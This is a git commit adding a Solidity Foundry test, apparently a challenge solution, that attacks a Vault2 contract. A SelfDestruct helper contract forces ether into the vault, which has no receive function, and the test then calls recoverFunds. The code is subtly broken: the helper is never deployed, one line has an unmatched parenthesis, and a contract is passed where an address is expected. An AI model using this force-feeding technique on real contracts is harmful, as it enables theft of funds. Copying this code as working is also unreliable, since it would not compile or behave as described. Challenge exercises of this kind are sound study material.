92ff467071849734798065a8244b078016d18056
Miguelcomolacerveza <113274338+Miguelcomolacerveza@users.noreply.github.com>
2023-07-19 09:45:21 +0200

    Create Vault2.sol

---
+++ Vault2.sol
@@ -0,0 +1,46 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity 0.8.11;
+
+import "forge-std/console.sol";
+import "forge-std/Test.sol";
+import "../src/Vault2.sol";
+
+contract SelfDestruct {
+
+     /// We create a contract selfdestruct to attack the vault. The reason is the vault´s contract does not have receive or fallback function.
+     /// Let´s add receive function to allow it to receive ether
+     receive() external payable {}
+
+  
+     /// Function to make this contract destroy itself and send its balance to address "receiver"  
+     function close(address receiver) public {
+        selfdestruct(payable(receiver));
+     }
+   } 
+
+contract Vault2Test is Test {
+    Vault2 public vault;
+    SelfDestruct public selfdestructor;
+    address public bob;
+
+    function setUp() public {
+        vault = new Vault2{value: 0.0001 ether}();
+    }
+    function testunlockVault() public {
+
+        bob = makeAddr("bob");
+        vm.startPrank(bob);
+        vm.deal(bob, 10 ether);
+
+        /// Sending some eth to selfdestruct contract
+        (bool sent1, ) = address(selfdestructor).call{value: 3 ether}("");
+        require(sent1, "Fail ether transfer");    
+
+        /// Destroy the contract
+        selfdestructor.close(vault));
+
+        /// We recover the funds 
+        vault.recoverFunds();
+        console.log("Balance", vault.balance());
+    }
+}
